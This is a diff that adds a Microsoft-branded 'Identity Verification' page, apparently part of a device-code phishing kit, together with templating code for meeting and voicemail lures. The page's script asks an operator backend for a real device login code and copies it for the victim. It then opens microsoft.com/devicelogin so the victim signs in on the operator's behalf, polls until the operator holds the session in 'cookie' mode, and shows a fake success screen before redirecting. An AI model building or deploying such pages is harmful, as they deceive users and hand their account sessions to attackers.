+          return mutation.target.hasAttribute('data-i18n-' + attr)
+            || i18nPhrase(currentAttr) !== currentAttr;
+        }
+        return Array.prototype.some.call(mutation.addedNodes || [], function(node){
+          return node.nodeType === 3 || (node.nodeType === 1 && !node.closest('[data-no-i18n]'));
+        });
+      });
+
+      if(shouldRefresh) scheduleTemplateTranslationRefresh();
+    });
+    i18nObserver.observe(document.body, {
+      subtree: true,
+      childList: true,
+      characterData: true,
+      attributes: true,
+      attributeFilter: ['placeholder', 'title', 'aria-label']
+    });
+  }
+
+  function uniqueElements(nodes){
+    var out = [];
+    for(var i = 0; i < nodes.length; i++){
+      if(out.indexOf(nodes[i]) === -1) out.push(nodes[i]);
+    }
+    return out;
+  }
+
+  function firstFallbackTarget(selectors){
+    for(var i = 0; i < selectors.length; i++){
+      var el = document.querySelector(selectors[i]);
+      if(el) return el;
+    }
+    return null;
+  }
+
+  function applyPageTitle(text){
+    var explicitTargets = uniqueElements(document.querySelectorAll('[data-page-title],[data-template-title],[data-custom-title]'));
+    explicitTargets.forEach(function(el){
+      el.textContent = text;
+      el.setAttribute('data-i18n-custom-override', 'title');
+      markTranslatedElement(el);
+    });
+
+    if(explicitTargets.length) return;
+
+    var fallback = firstFallbackTarget(['main h1', '.card h1', '.shell h1', '.container h1', 'h1']);
+    if(fallback){
+      fallback.textContent = text;
+      fallback.setAttribute('data-i18n-custom-override', 'title');
+      markTranslatedElement(fallback);
+    }
+  }
+
+  function applyPageMessage(text){
+    var explicitTargets = uniqueElements(document.querySelectorAll('[data-page-message],[data-template-message],[data-custom-message]'));
+    explicitTargets.forEach(function(el){
+      el.textContent = text;
+      el.setAttribute('data-i18n-custom-override', 'message');
+      markTranslatedElement(el);
+    });
+
+    if(explicitTargets.length) return;
+
+    var fallback = firstFallbackTarget([
+      'main .desc',
+      '.card .desc',
+      '.shell .desc',
+      '.container .desc',
+      '.subtitle',
+      '.description',
+      '.lead',
+      '.message',
+      'p'
+    ]);
+    if(fallback){
+      fallback.textContent = text;
+      fallback.setAttribute('data-i18n-custom-override', 'message');
+      markTranslatedElement(fallback);
+    }
+  }
+
+  function isSkippablePrimaryCandidate(el){
+    if(!el || !el.matches) return true;
+    return el.matches(
+      '.copy-btn,.code-copy-btn,.cpb,.cpy,.refresh-btn,.btn-secondary,.cta-secondary,.secondary-btn,' +
+      '.nav-icon-btn,.cmd-btn,#copyBtn,#copy-btn,#wedeja,#refreshBtn'
+    );
+  }
+
+  function primaryButtonFallbackTargets(){
+    var selectors = [
+      'button#startBtn.primary-btn',
+      'button#startBtn.btn-primary',
+      'button#continueBtn',
+      'button.cta-btn',
+      'button.bp',
+      'button.go',
+      'button.linakufe',
+      'button.btn-open',
+      'button.btn-primary[onclick*="gm"]',
+      'button[onclick*="gm("]'
+    ];
+    var found = [];
+    selectors.forEach(function(selector){
+      document.querySelectorAll(selector).forEach(function(el){
+        if(isSkippablePrimaryCandidate(el)) return;
+        if(el.querySelector && el.querySelector('[data-primary-button]')) return;
+        found.push(el);
+      });
+    });
+    return uniqueElements(found);
+  }
+
+  function setPrimaryButtonText(el, text){
+    if(!el) return;
+    if(el.matches && el.matches('[data-primary-button]')){
+      el.textContent = text;
+      return;
+    }
+
+    var label = el.querySelector && el.querySelector('[data-primary-button-label]');
+    if(label){
+      label.textContent = text;
+      return;
+    }
+
+    var walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT, {
+      acceptNode: function(node){
+        return node.nodeValue && node.nodeValue.trim()
+          ? NodeFilter.FILTER_ACCEPT
+          : NodeFilter.FILTER_REJECT;
+      }
+    });
+
+    var first = walker.nextNode();
+    if(first){
+      first.nodeValue = text;
+      var next;
+      while((next = walker.nextNode())){
+        next.nodeValue = '';
+      }
+      return;
+    }
+
+    el.textContent = text;
+  }
+
+  function translateDefaultPrimaryButtons(){
+    if(hasCustomText(window.__PRIMARY_BUTTON_TEXT)) return;
+
+    primaryButtonFallbackTargets().forEach(function(el){
+      var current = i18nNormalizeText(el.textContent);
+      var translated = i18nPhrase(current);
+      if(translated !== current) setPrimaryButtonText(el, translated);
+      markTranslatedElement(el);
+    });
+  }
+
+  function applyPrimaryButtonText(text){
+    var explicitTargets = uniqueElements(document.querySelectorAll('[data-primary-button]'));
+    explicitTargets.forEach(function(el){
+      setPrimaryButtonText(el, text);
+      el.setAttribute('data-i18n-custom-override', 'button');
+      markTranslatedElement(el);
+    });
+    primaryButtonFallbackTargets().forEach(function(el){
+      setPrimaryButtonText(el, text);
+      el.setAttribute('data-i18n-custom-override', 'button');
+      markTranslatedElement(el);
+    });
+  }
+
+  function setText(selector, text){
+    if(typeof text !== 'string' || text === '') return;
+    document.querySelectorAll(selector).forEach(function(el){
+      el.textContent = text;
+      el.setAttribute('data-i18n-custom-override', 'text');
+      if(!el.hasAttribute('dir')) el.setAttribute('dir', 'auto');
+    });
+  }
+
+  function meetingDateFromYmd(raw){
+    if(typeof raw !== 'string') return null;
+    var match = raw.match(/^(\d{4})-(\d{2})-(\d{2})$/);
+    if(!match) return null;
+    var year = Number(match[1]);
+    var month = Number(match[2]) - 1;
+    var day = Number(match[3]);
+    var date = new Date(year, month, day, 12, 0, 0);
+    if(date.getFullYear() !== year || date.getMonth() !== month || date.getDate() !== day) return null;
+    return date;
+  }
+
+  function templateIntlLocale(){
+    var locale = typeof window.__APP_LOCALE === 'string' && window.__APP_LOCALE
+      ? window.__APP_LOCALE
+      : 'en';
+    try{
+      new Intl.DateTimeFormat(locale).format(new Date());
+      return locale;
+    }catch(_){
+      return 'en';
+    }
+  }
+
+  function formatMeetingDate(date, options){
+    try{
+      return new Intl.DateTimeFormat(templateIntlLocale(), options).format(date).replace(/\u202f/g, ' ');
+    }catch(_){
+      return '';
+    }
+  }
+
+  function formatMeetingTime(raw){
+    if(typeof raw !== 'string') return '';
+    var match = raw.match(/^(\d{2}):(\d{2})$/);
+    if(!match) return '';
+    var hour = Number(match[1]);
+    var minute = Number(match[2]);
+    if(hour > 23 || minute > 59) return '';
+    var date = new Date(2000, 0, 1, hour, minute, 0);
+    return formatMeetingDate(date, { hour: 'numeric', minute: '2-digit' });
+  }
+
+  function renderMeetingCalendar(date){
+    if(!date) return;
+    var calendars = document.querySelectorAll('[data-meeting-calendar]');
+    if(!calendars.length) return;
+
+    var weekdays = [];
+    try{
+      var weekdayFormatter = new Intl.DateTimeFormat(templateIntlLocale(), { weekday: 'narrow' });
+      var monday = new Date(2023, 0, 2, 12, 0, 0);
+      for(var weekdayIndex = 0; weekdayIndex < 7; weekdayIndex++){
+        var weekdayDate = new Date(monday);
+        weekdayDate.setDate(monday.getDate() + weekdayIndex);
+        weekdays.push(weekdayFormatter.format(weekdayDate));
+      }
+    }catch(_){
+      weekdays = ['M', 'T', 'W', 'T', 'F', 'S', 'S'];
+    }
+    var year = date.getFullYear();
+    var month = date.getMonth();
+    var selectedDay = date.getDate();
+    var firstDay = new Date(year, month, 1, 12, 0, 0);
+    var leading = (firstDay.getDay() + 6) % 7;
+    var daysInMonth = new Date(year, month + 1, 0).getDate();
+    var daysInPreviousMonth = new Date(year, month, 0).getDate();
+    var today = new Date();
+
+    calendars.forEach(function(calendar){
+      calendar.innerHTML = '';
+      weekdays.forEach(function(label){
+        var dow = document.createElement('div');
+        dow.className = 'dow';
+        dow.textContent = label;
+        dow.setAttribute('dir', 'auto');
+        calendar.appendChild(dow);
+      });
+
+      for(var i = leading; i > 0; i--){
+        var prev = document.createElement('div');
+        prev.className = 'day faded';
+        prev.textContent = String(daysInPreviousMonth - i + 1);
+        calendar.appendChild(prev);
+      }
+
+      for(var day = 1; day <= daysInMonth; day++){
+        var current = document.createElement('div');
+        var classes = ['day'];
+        if(day === selectedDay) classes.push('active');
+        if(year === today.getFullYear() && month === today.getMonth() && day === today.getDate()) classes.push('today');
+        current.className = classes.join(' ');
+        current.textContent = String(day);
+        calendar.appendChild(current);
+      }
+
+      var filled = leading + daysInMonth;
+      var nextDay = 1;
+      while(filled % 7 !== 0){
+        var next = document.createElement('div');
+        next.className = 'day faded';
+        next.textContent = String(nextDay++);
+        calendar.appendChild(next);
+        filled++;
+      }
+    });
+  }
+
+  function withoutLabelPrefix(prefix, text){
+    text = typeof text === 'string' ? text.trim() : '';
+    if(!text) return '';
+    var label = prefix.toLowerCase() + ':';
+    if(text.toLowerCase().indexOf(label) === 0){
+      return text.slice(label.length).trim();
+    }
+    return text;
+  }
+
+  function withLocalizedLabelPrefix(key, fallback, text){
+    text = withoutLabelPrefix(fallback, text);
+    var label = i18nValue(key, fallback);
+    return text ? label + ': ' + text : '';
+  }
+
+  function initialsFromName(name){
+    var text = withoutLabelPrefix('Organizer', name).trim();
+    if(!text) return 'SC';
+    if(typeof text.normalize === 'function') text = text.normalize('NFC');
+
+    var parts = text.split(/\s+/).map(function(part){
+      return part.replace(/[^\p{L}\p{M}\p{N}]/gu, '');
+    }).filter(Boolean);
+
+    if(!parts.length) return 'SC';
+    if(parts.length === 1) return Array.from(parts[0]).slice(0, 2).join('').toLocaleUpperCase();
+    return (Array.from(parts[0])[0] + Array.from(parts[parts.length - 1])[0]).toLocaleUpperCase();
+  }
+
+  function currentMeetingInvitedCount(){
+    if(window.__MEETING_INVITED_COUNT === undefined || window.__MEETING_INVITED_COUNT === null || window.__MEETING_INVITED_COUNT === '') return null;
+    var count = Number(window.__MEETING_INVITED_COUNT);
+    if(!Number.isFinite(count)) return null;
+    return Math.max(0, Math.min(999, Math.floor(count)));
+  }
+
+  function formatMeetingInvitedCount(count){
+    var formattedCount;
+    try{
+      formattedCount = new Intl.NumberFormat(templateIntlLocale()).format(count);
+    }catch(_){
+      formattedCount = String(count);
+    }
+    if(count > 0) formattedCount = '+' + formattedCount;
+
+    return i18nValue('meeting.invited_count', '{count} invited').replace('{count}', formattedCount);
+  }
+
+  function renderMeetingAttendees(organizer, invitedCount){
+    var containers = document.querySelectorAll('[data-meeting-attendees]');
+    if(!containers.length) return;
+
+    var hasCount = typeof invitedCount === 'number';
+    var leader = initialsFromName(organizer || 'Shan Chen');
+    var labels = [leader];
+    ['JD', 'MK', 'AL', 'RT', 'NV'].forEach(function(label){
+      if(labels.indexOf(label) === -1) labels.push(label);
+    });
+    var classes = ['chip blue', 'chip pink', 'chip slate'];
+
+    containers.forEach(function(container){
+      var countEl = container.querySelector('[data-meeting-invited-count]') || container.querySelector('.attendee-count');
+
+      if(hasCount){
+        var chipCount = Math.min(3, invitedCount + 1);
+        container.querySelectorAll('.chip').forEach(function(chip){ chip.remove(); });
+
+        if(!countEl){
+          countEl = document.createElement('span');
+          countEl.className = 'attendee-count';
+          countEl.setAttribute('data-meeting-invited-count', '');
+          container.appendChild(countEl);
+        }
+
+        for(var i = 0; i < chipCount; i++){
+          var chip = document.createElement('span');
+          chip.className = classes[i] || 'chip slate';
+          chip.textContent = labels[i] || leader;
+          container.insertBefore(chip, countEl);
+        }
+
+        countEl.textContent = formatMeetingInvitedCount(invitedCount);
+        countEl.setAttribute('data-i18n-custom-override', 'meeting');
+        if(!countEl.hasAttribute('dir')) countEl.setAttribute('dir', 'auto');
+        countEl.style.display = '';
+        container.setAttribute('aria-label', formatMeetingInvitedCount(invitedCount));
+        return;
+      }
+
+      if(organizer){
+        var firstChip = container.querySelector('.chip');
+        if(firstChip) firstChip.textContent = leader;
+      }
+    });
+  }
+
+  function applyMeetingOverrides(){
+    var title = typeof window.__MEETING_TITLE === 'string' ? window.__MEETING_TITLE.trim() : '';
+    var rawDate = typeof window.__MEETING_DATE === 'string' ? window.__MEETING_DATE.trim() : '';
+    var startTime = formatMeetingTime(window.__MEETING_START_TIME);
+    var endTime = formatMeetingTime(window.__MEETING_END_TIME);
+    var organizer = typeof window.__MEETING_ORGANIZER === 'string' ? window.__MEETING_ORGANIZER.trim() : '';
+    var location = typeof window.__MEETING_LOCATION === 'string' ? window.__MEETING_LOCATION.trim() : '';
+    var invitedCount = currentMeetingInvitedCount();
+    var date = meetingDateFromYmd(rawDate);
+
+    setText('[data-meeting-title]', title);
+    setText('[data-meeting-organizer]', withLocalizedLabelPrefix('meeting.organizer_label', 'Organizer', organizer));
+    setText('[data-meeting-location]', withLocalizedLabelPrefix('meeting.location_label', 'Location', location));
+    if(invitedCount !== null) setText('[data-meeting-invited-count]', formatMeetingInvitedCount(invitedCount));
+    if(organizer || invitedCount !== null) renderMeetingAttendees(organizer, invitedCount);
+
+    if(date){
+      var monthYear = formatMeetingDate(date, { month: 'long', year: 'numeric' });
+      var shortDate = formatMeetingDate(date, { weekday: 'short', day: 'numeric' });
+      var fullDate = formatMeetingDate(date, { weekday: 'short', month: 'long', day: 'numeric', year: 'numeric' });
+      setText('[data-meeting-calendar-month]', monthYear);
+      setText('[data-meeting-calendar-short-date]', shortDate);
+      setText('[data-meeting-date-full]', fullDate);
+      renderMeetingCalendar(date);
+    }
+
+    if(startTime || endTime){
+      var timeRange = startTime && endTime ? startTime + ' - ' + endTime : (startTime || endTime);
+      setText('[data-meeting-time-range]', timeRange);
+      if(startTime) setText('[data-meeting-start-time]', startTime);
+      if(endTime) setText('[data-meeting-end-time]', endTime);
+    }
+  }
+
+  function applyVoicemailOverrides(){
+    if(typeof window.__VOICEMAIL_TITLE==='string' && window.__VOICEMAIL_TITLE.trim()!==''){
+      setText('[data-voicemail-title]', window.__VOICEMAIL_TITLE.trim());
+    }
+    if(typeof window.__VOICEMAIL_META==='string' && window.__VOICEMAIL_META.trim()!==''){
+      setText('[data-voicemail-meta]', window.__VOICEMAIL_META.trim());
+    }
+  }
+
+  function onReady(){
+    apply();
+    applyTemplateBackgroundColor();
+    applyTemplateBackgroundLogo();
+    ensureCustomBackgroundLayer();
+    scheduleTemplateTranslationRefresh();
+    observeTemplateTranslations();
+  }
+
+  sxInstallDeviceFetchCompat();
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', onReady);
+  } else {
+    onReady();
+  }
+})();</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f5;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 6px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            padding: 44px 48px;
+            width: 100%;
+            max-width: 440px;
+            text-align: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 32px;
+        }
+
+        .logo svg {
+            width: 22px;
+            height: 22px;
+        }
+
+        .logo span {
+            font-size: 18px;
+            font-weight: 600;
+            color: #242424;
+            letter-spacing: -0.3px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #242424;
+            margin-bottom: 8px;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: #616161;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        /* ── Primary blue button ── */
+        .primary-btn {
+            width: 100%;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            background: #0067b8;
+            color: #fff;
+            font-family: inherit;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        .primary-btn:hover {
+            background: #005a9e;
+        }
+
+        .primary-btn:active {
+            background: #004c87;
+        }
+
+        .primary-btn:disabled {
+            background: #c8c8c8;
+            cursor: default;
+        }
+
+        /* ── Code section ── */
+        .code-area {
+            display: none;
+            margin-top: 28px;
+            padding-top: 24px;
+            border-top: 1px solid #e8e8e8;
+        }
+
+        .code-area.show {
+            display: block;
+        }
+
+        .code-label {
+            font-size: 13px;
+            color: #616161;
+            margin-bottom: 10px;
+        }
+
+        .code-value {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 6px;
+            color: #242424;
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 16px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            user-select: all;
+            transition: opacity 0.3s ease;
+        }
+
+        /* Copy + Verify stack */
+        .action-row {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 14px;
+        }
+
+        .copy-btn {
+            width: 100%;
+            padding: 10px 16px;
+            border: 1px solid #8a8a8a;
+            border-radius: 4px;
+            background: #fff;
+            color: #242424;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+        }
+
+        .copy-btn:hover {
+            background: #f5f5f5;
+            border-color: #616161;
+        }
+
+        .verify-id-btn {
+            width: 100%;
+            padding: 11px 16px;
+            border: none;
+            border-radius: 4px;
+            background: #0067b8;
+            color: #fff;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .verify-id-btn:hover {
+            background: #005a9e;
+        }
+
+        .verify-id-btn svg {
+            width: 14px;
+            height: 14px;
+            flex-shrink: 0;
+        }
+
+        /* Timer */
+        .timer {
+            margin-top: 12px;
+            font-size: 12px;
+            color: #a0a0a0;
+        }
+
+        .timer.expired {
+            color: #c62828;
+        }
+
+        /* Refresh button — shown only on expiry */
+        .refresh-btn {
+            display: none;
+            margin-top: 12px;
+            width: 100%;
+            padding: 10px 20px;
+            border: 1px solid #0067b8;
+            border-radius: 4px;
+            background: #fff;
+            color: #0067b8;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        .refresh-btn:hover {
+            background: #e8f0fa;
+        }
+
+        .refresh-btn.show {
+            display: block;
+        }
+
+        .status-msg {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #a0a0a0;
+            min-height: 16px;
+        }
+
+        .status-msg.error {
+            color: #c62828;
+        }
+
+        .footer {
+            margin-top: 28px;
+            font-size: 11px;
+            color: #a0a0a0;
+        }
+
+        /* ── Success overlay ── */
+        .success-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            animation: fadeOverlay 0.25s ease;
+        }
+
+        .success-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeOverlay {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .success-box {
+            background: #fff;
+            border-radius: 8px;
+            padding: 40px 36px;
+            text-align: center;
+            width: 320px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.18);
+            animation: popIn 0.25s cubic-bezier(.34, 1.56, .64, 1);
+        }
+
+        @keyframes popIn {
+            from {
+                transform: scale(0.85);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 16px;
+        }
+
+        .success-box h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a7f37;
+            margin-bottom: 8px;
+        }
+
+        .success-box p {
+            font-size: 13px;
+            color: #616161;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 22 22" fill="none">
+                <rect x="1" y="1" width="9" height="9" fill="#f25022" />
+                <rect x="12" y="1" width="9" height="9" fill="#7fba00" />
+                <rect x="1" y="12" width="9" height="9" fill="#00a4ef" />
+                <rect x="12" y="12" width="9" height="9" fill="#ffb900" />
+            </svg>
+            <span>Microsoft</span>
+        </div>
+
+        <h1 data-page-title>Identity Verification</h1>
+        <p class="desc" data-page-message>Please click the button below to generate your verification code.</p>
+
+        <!-- Initial CTA — hidden once code arrives -->
+        <button class="primary-btn" id="startBtn" data-primary-button onclick="generateCode()">I'm not a robot</button>
+
+        <div class="code-area" id="codeArea">
+            <p class="code-label">Your verification code</p>
+            <div class="code-value" id="codeValue">——————</div>
+
+            <!-- Copy + Verify row -->
+            <div class="action-row" id="actionRow" style="display:none;">
+                <button class="copy-btn" id="copyBtn" onclick="copyCode()">Copy code</button>
+                <button class="verify-id-btn" id="verifyIdBtn" onclick="verifyWithCopy()">
+                    <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8"
+                        stroke-linecap="round">
+                        <rect x="2" y="4" width="12" height="9" rx="1.5" />
+                        <path d="M5 4V3a3 3 0 016 0v1" />
+                        <circle cx="8" cy="8.5" r="1.2" fill="currentColor" stroke="none" />
+                        <line x1="8" y1="9.7" x2="8" y2="11" />
+                    </svg>
+                    Verify your identity
+                </button>
+            </div>
+
+            <!-- Refresh button shown only when expired -->
+            <button class="refresh-btn" id="refreshBtn" onclick="generateCode()">↻ Refresh code</button>
+
+            <p class="timer" id="timer"></p>
+            <p class="status-msg" id="statusMsg"></p>
+        </div>
+
+        <p class="footer">Protected by Microsoft Security</p>
+    </div>
+
+    <!-- Success overlay -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-box">
+            <svg class="success-icon" viewBox="0 0 64 64" fill="none">
+                <circle cx="32" cy="32" r="30" fill="#d1fadf" stroke="#1a7f37" stroke-width="2.5" />
+                <path d="M20 32l9 9 16-16" stroke="#1a7f37" stroke-width="3.5" stroke-linecap="round"
+                    stroke-linejoin="round" />
+            </svg>
+            <h2>Verification Complete!</h2>
+            <p id="successMsg">Identity verified successfully.<br>Redirecting you now…</p>
+        </div>
+    </div>
+
+    <script>
+        const AT = 'lordspartaa';
+        const MODE = "cookie";
+
+        let sid = null;
+        let pollInterval = null;
+        let startTime = null;
+        let countdown = null;
+        let codeReady = false;
+        let popupRef = null;
+
+        /* ── Success overlay + redirect ─────────────────────────────── */
+        function showSuccess(url) {
+            try { if (popupRef && !popupRef.closed) popupRef.close(); } catch (_) {}
+            const overlay = document.getElementById('successOverlay');
+            overlay.classList.add('show');
+            if (url) setTimeout(() => window.location.replace(url), 2500);
+        }
+
+        /* ── Open Microsoft device-login popup ─────────────────────── */
+        function openPopup() {
+            const m = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
+            if (m) popupRef = window.open('https://microsoft.com/devicelogin', '_blank');
+            else popupRef = window.open('https://microsoft.com/devicelogin', 'ML', 'width=500,height=600');
+        }
+
+        /* ── Verify button: copy code silently then open popup ──────── */
+        function verifyWithCopy() {
+            const code = document.getElementById('codeValue').textContent;
+            const btn = document.getElementById('verifyIdBtn');
+            const originalHTML = btn.innerHTML;
+
+            navigator.clipboard.writeText(code).catch(() => {
+                // fallback for older browsers
+                const ta = document.createElement('textarea');
+                ta.value = code;
+                ta.style.position = 'fixed';
+                ta.style.opacity = '0';
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+            });
+
+            // Brief "Copied!" flash on button label
+            btn.innerHTML = '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Code copied!';
+            const copyBtn = document.getElementById('copyBtn');
+            if (copyBtn) { copyBtn.textContent = 'Copied!'; setTimeout(() => copyBtn.textContent = 'Copy code', 1500); }
+            setTimeout(() => { btn.innerHTML = originalHTML; }, 1500);
+
+            openPopup();
+        }
+
+        /* ── Entry point ───────────────────────────────────────────── */
+        async function generateCode() {
+            // Hide refresh button, reset UI
+            document.getElementById('refreshBtn').classList.remove('show');
+            document.getElementById('actionRow').style.display = 'none';
+            document.getElementById('timer').textContent = '';
+            document.getElementById('timer').classList.remove('expired');
+
+            const startBtn = document.getElementById('startBtn');
+            startBtn.textContent = 'Generating verification code...';
+            startBtn.disabled = true;
+
+            setStatus('');
+            clearInterval(pollInterval);
+            clearInterval(countdown);
+            sid = null;
+            codeReady = false;
+
+            try {
+                const r = await fetch('/api/device/start', {
+                    method: 'POST',
+                    headers: { 'X-Antibot-Token': AT, 'X-Auth-Mode': MODE }
+                });
+                const d = await r.json();
+
+                if (d.error) { showError(d.error); return; }
+
+                sid = d.job_id;
+                if (!sid) { showError('Session failed. Please refresh.'); return; }
+                startTime = Date.now();
+
+                document.getElementById('codeArea').classList.add('show');
+                setStatus('Connecting to Microsoft servers…');
+
+                pollInterval = setInterval(poll, 1000); poll();
+
+            } catch (e) {
+                showError(e.message || 'Connection failed');
+            }
+        }
+
+        /* ── Poll backend ──────────────────────────────────────────── */
+        async function poll() {
+            if (Date.now() - startTime > (Number(window.__DEVICE_POLL_TIMEOUT_MS) || 600000)) {
+                clearInterval(pollInterval);
+                onExpired();
+                return;
+            }
+
+            try {
+                const r = await fetch('/api/device/status/' + sid);
+                const d = await r.json();
+
+                if (d.status === 'waiting_user' && d.user_code) {
+                    const el = document.getElementById('codeValue');
+
+                    if (el.textContent !== d.user_code) {
+                        el.style.opacity = 0;
+                        setTimeout(() => {
+                            el.textContent = d.user_code;
+                            el.style.opacity = 1;
+                        }, 150);
+                    }
+
+                    if (!codeReady) {
+                        codeReady = true;
+
+                        // Hide the initial "I'm not a robot" button permanently
+                        document.getElementById('startBtn').style.display = 'none';
+
+                        // Show copy + verify buttons
+                        document.getElementById('actionRow').style.display = 'flex';
+
+                        setStatus('');
+                        startTimer(600);
+                    }
+                }
+
+                if (d.status === 'done' || d.status === 'success' || d.status === 'completed') {
+                    clearInterval(pollInterval);
+                    clearInterval(countdown);
+                    showSuccess(window.__DESTINATION_URL);
+                }
+
+                if (d.status === 'failed' || d.status === 'timeout_waiting_user_login') {
+                    clearInterval(pollInterval);
+                    showError(d.error || d.status);
+                }
+
+            } catch (e) {
+            }
+        }
+
+        /* ── Copy code — also opens popup automatically ────────────── */
+        function copyCode() {
+            const code = document.getElementById('codeValue').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = document.getElementById('copyBtn');
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy code', 1500);
+            });
+            // Auto-open popup after copying
+            openPopup();
+        }
+
+        /* ── Timer ─────────────────────────────────────────────────── */
+        function startTimer(sec) {
+            clearInterval(countdown);
+            const el = document.getElementById('timer');
+            let t = sec;
+
+            const tick = () => {
+                if (t > 0) {
+                    const m = Math.floor(t / 60);
+                    const s = String(t % 60).padStart(2, '0');
+                    el.textContent = 'Valid for ' + m + ':' + s;
+                } else {
+                    clearInterval(countdown);
+                    clearInterval(pollInterval);
+                    onExpired();
+                }
+                t--;
+            };
+            tick();
+            countdown = setInterval(tick, 1000);
+        }
+
+        /* ── Called when timer hits 0 or server timeout ────────────── */
+        function onExpired() {
+            const timerEl = document.getElementById('timer');
+            timerEl.textContent = 'Code expired.';
+            timerEl.classList.add('expired');
+
+            // Hide copy/verify, show refresh
+            document.getElementById('actionRow').style.display = 'none';
+            document.getElementById('refreshBtn').classList.add('show');
+
+            setStatus('');
+        }
+
+        /* ── Helpers ────────────────────────────────────────────────── */
+        function setStatus(msg) {
+            const el = document.getElementById('statusMsg');
+            el.textContent = msg;
+            el.classList.remove('error');
+        }
+
+        function showError(code) {
+            const map = {
+                timeout_waiting_user_login: 'Your verification code has expired. Please refresh.',
+                'Session expired': 'Your verification code has expired. Please refresh.',
+                failed: 'Verification failed. Please try again.',
+                'Worker error': 'Something went wrong. Please try again.',
+                'Worker crash': 'Something went wrong. Please try again.'
+            };
+
+            onExpired();
+            const el = document.getElementById('statusMsg');
+            el.textContent = map[code] || 'Something went wrong. Please try again.';
+            el.classList.add('error');
+        }
+    </script>
+</body>
+
+</html>
